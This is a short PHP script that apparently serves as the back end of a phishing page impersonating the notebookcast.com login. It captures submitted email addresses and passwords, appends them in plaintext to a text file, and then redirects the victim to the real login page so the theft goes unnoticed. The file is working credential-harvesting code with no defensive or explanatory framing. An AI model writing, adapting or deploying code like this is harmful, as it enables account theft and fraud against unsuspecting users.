<?php
$file = 'text.txt';

$email = isset($_POST["email"]) ? $_POST["email"] : '';
$pass = isset($_POST["pass"]) ? $_POST["pass"] : '';

if ($email === '' || $pass === '') {
    header("Location: loginerror.html");
    exit;
}

$content = "\r\nEMAIL: $email\r\nPASSWORD: $pass\r\n\r\n";

if (is_writable($file)) {
    $gestor = fopen($file, "a");
    if ($gestor) {
        fwrite($gestor, $content);
        fclose($gestor);
    } else {
        echo "<p>Error al abrir el archivo</p>";
        exit;
    }
} else {
    echo "<p>Archivo no escribible</p>";
    exit;
}

header("Location:https://www.notebookcast.com/es/login");

exit;
?>
